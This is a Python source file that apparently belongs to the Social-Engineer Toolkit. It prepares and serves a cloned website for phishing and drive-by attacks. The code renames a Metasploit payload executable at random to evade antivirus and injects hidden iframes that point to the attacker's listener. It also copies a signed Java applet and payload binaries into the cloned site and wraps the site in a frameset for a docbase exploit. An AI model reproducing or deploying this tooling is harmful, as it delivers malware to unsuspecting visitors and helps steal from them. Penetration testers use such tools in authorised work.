#!/usr/bin/env python
import SimpleHTTPServer
import SocketServer
import sys
import os
import subprocess
import re
import threading
import socket

from SocketServer import ThreadingMixIn
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# grab os variables and path
definepath=os.getcwd()

sys.path.append(definepath)

from src.core.setcore import *

# define if use apache or not
apache=0
# open set_config here
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
	# strip \r\n
        line=line.rstrip()
	# if apache is turned on get things ready
        match=re.search("APACHE_SERVER=ON",line)
	# if its on lets get apache ready
        if match:
                for line2 in apache_check:
			# set the apache path here
			match2=re.search("APACHE_DIRECTORY=", line2)
			if match2:
				line2=line2.rstrip()
				apache_path=line2.replace("APACHE_DIRECTORY=","")
				apache=1

# GRAB DEFAULT PORT FOR WEB SERVER
fileopen=file("config/set_config" , "r").readlines()
counter=0
for line in fileopen:
        line=line.rstrip()
        match=re.search("WEB_PORT=", line)
        if match:
                line=line.replace("WEB_PORT=", "")
                web_port=line
                counter=1
if counter == 0: web_port=80

# see if exploit requires webdav
if os.path.isfile("src/program_junk/meta_config"):
	fileopen=file("src/program_junk/meta_config", "r")
	for line in fileopen:
		line=line.rstrip()
		match=re.search("set SRVPORT 80", line)
		if match:
			match2=re.search("set SRVPORT 8080", line)
			if not match2:
				web_port=8080

# Open the IPADDR file
fileopen=file("src/program_junk/ipaddr.file","r").readlines()
for line in fileopen:
    line=line.rstrip()
    ipaddr=line

# Grab custom or set defined
if os.path.isfile("src/program_junk/site.template"):
        fileopen=file("src/program_junk/site.template","r").readlines()
        for line in fileopen:
                line=line.rstrip()
                match=re.search("TEMPLATE=", line)
                if match:
                        line=line.split("=")
                        template=line[1]
	
# grab web attack selection
if os.path.isfile("src/program_junk/attack_vector"):
        fileopen=file("src/program_junk/attack_vector","r").readlines()
        for line in fileopen:
	        attack_vector=line.rstrip()

# if it doesn't exist just set a default template
if not os.path.isfile("src/program_junk/attack_vector"):
        attack_vector = "nada"

# Sticking it to A/V below
import string,random
def random_string(minlength=6,maxlength=15):
  length=random.randint(minlength,maxlength)
  letters=string.ascii_letters+string.digits
  return ''.join([random.choice(letters) for _ in range(length)])
rand_gen=random_string() #+".exe"

# check multiattack flags here
multiattack_harv = "off"
if os.path.isfile("src/program_junk/multi_harvester"):
	multiattack_harv = "on"
if os.path.isfile("src/program_junk/multi_tabnabbing"):
	multiattack_harv = "on"

# open our config file that was specified in SET
if os.path.isfile("src/program_junk/site.template"):
        fileopen=file("src/program_junk/site.template", "r").readlines()
        # start loop here
        for line in fileopen:
                line=line.rstrip()
                # look for config file and parse for URL
                match=re.search("URL=",line)
                if match:
                        line=line.split("=")
                        # define url to clone here
                        url=line[1].rstrip()
# if we didn't create template then do self
if not os.path.isfile("src/program_junk/site.template"):
        template = "SELF"


# If SET is setting up the website for you, get the website ready for delivery
if template == "SET":

	# change to that directory
	os.chdir("src/html/")
	# remove stale index.html files
	if os.path.isfile("index.html"):
		subprocess.Popen("rm index.html 2> /dev/null",shell=True).wait()
	# define files and get ipaddress set in index.html
	fileopen=file("index.template", "r").readlines()
	filewrite=file("index.html", "w")
	if attack_vector == "java":
		for line in fileopen:
			match1=re.search("msf.exe", line)
			if match1: line=line.replace("msf.exe", rand_gen)
			match=re.search("ipaddrhere", line)
			if match:
				line=line.replace("ipaddrhere", ipaddr)
			filewrite.write(line)
		# move random generated name
		filewrite.close()
		subprocess.Popen("mv msf.exe %s" % (rand_gen), shell=True).wait()

	# define browser attack vector here
	if attack_vector == "browser":
		counter=0
		for line in fileopen:
			counter=0
			match=re.search("Signed_Update.jar", line)
			if match:
				line=line.replace("Signed_Update.jar", "invalid.jar")
				filewrite.write(line)
				counter=1
			match2=re.search("<head>", line)
			if match2:
				if web_port != 8080:
					line=line.replace("<head>", '<head><iframe src ="http://%s:8080/" width="100" height="100" scrolling="no"></iframe>' % (ipaddr))
					filewrite.write(line)
					counter=1
				if web_port == 8080:
					line=line.replace("<head>", '<head><iframe src = "http://%s:80/" width="100" height="100" scrolling="no" ></iframe>' % (ipaddr))
					filewrite.write(line)
					counter=1
			if counter == 0:
				filewrite.write(line)
	filewrite.close()


if template == "CUSTOM" or template == "SELF":
	# Bring our files to our directory
	if attack_vector != 'hid': 
		if attack_vector != 'hijacking':
			print "\n" + bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC
			subprocess.Popen("cp %s/src/program_junk/Signed_Update.jar %s/src/program_junk/web_clone/;cp %s/src/html/nix.bin %s/src/program_junk/web_clone;cp %s/src/html/mac.bin %s/src/program_junk/web_clone/;cp %s/src/html/msf.exe %s/src/program_junk/web_clone/" % (definepath,definepath,definepath,definepath,definepath,definepath,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
			# pull random name generation
                        PrintStatus("The site has been moved. SET Web Server is now listening..")
			if os.path.isfile("%s/src/program_junk/rand_gen" % (definepath)):
				fileopen=file("%s/src/program_junk/rand_gen" % (definepath), "r")
				for line in fileopen:
					rand_gen=line.rstrip()
				if os.path.isfile("%s/src/program_junk/custom.exe" % (definepath)):
					subprocess.Popen("cp %s/src/html/msf.exe %s/src/program_junk/web_clone" % (definepath,definepath), shell=True).wait()
					print "\n[*] Website has been cloned and custom payload imported. Have someone browse your site now"
				subprocess.Popen("mv %s/src/program_junk/web_clone/msf.exe %s/src/program_junk/web_clone/%s 1> /dev/null 2> /dev/null" % (definepath,definepath,rand_gen), shell=True).wait()
	os.chdir("%s/src/program_junk/web_clone" % (definepath))

# if docbase exploit do some funky stuff to get it to work right
#  <TITLE>Client  Log In</TITLE>
if os.path.isfile("%s/src/program_junk/docbase.file" % (definepath)):
	docbase=(r"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
  		 "http://www.w3.org/TR/html4/frameset.dtd">
		<HTML>
		<HEAD>
		<TITLE></TITLE>
		</HEAD>
		<FRAMESET rows="99%%, 1%%">
      		<FRAME src="site.html">
      		<FRAME name=docbase noresize borders=0 scrolling=no src="http://%s:8080">
		</FRAMESET>
		</HTML>""" % (ipaddr))

	subprocess.Popen("mv %s/src/program_junk/web_clone/index.html %s/src/program_junk/web_clone/site.html 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
	filewrite=file("%s/src/program_junk/web_clone/index.html" % (definepath), "w")
	filewrite.write(docbase)
	filewrite.close()	

####################################################################################################################################
#
# START WEB SERVER STUFF HERE
#
####################################################################################################################################
if apache == 0:
	if multiattack_harv == 'off':
		# specify port listener here
		# get SimpleHTTP up and running
		Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
		class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
		        pass

		try:
			class ReusableTCPServer(SocketServer.TCPServer):
    				allow_reuse_address = True
        		server = ReusableTCPServer(('', int(web_port)), Handler)
        		server.serve_forever()		

		# Handle KeyboardInterrupt
		except KeyboardInterrupt:
                        ExitSet()
                
		# Handle Exceptions
		except Exception,e:
			log(e)
			print bcolors.RED + "ERROR: You probably have something running on port 80 already, Apache??"
			print "There was an issue, printing error: " +str(e) + bcolors.ENDC
                        ExitSet()
if apache == 1:
	subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/src/program_junk/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/src/html/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/src/program_junk/Signed* %s 1> /dev/null 2> /dev/null" % (definepath,apache_path,definepath,apache_path,definepath,apache_path,definepath,apache_path,definepath,apache_path), shell=True).wait()

#####################################################################################################################################
#
# END WEB SERVER STUFF HERE
#
#####################################################################################################################################

# Grab metaspoit path
meta_path=meta_path()
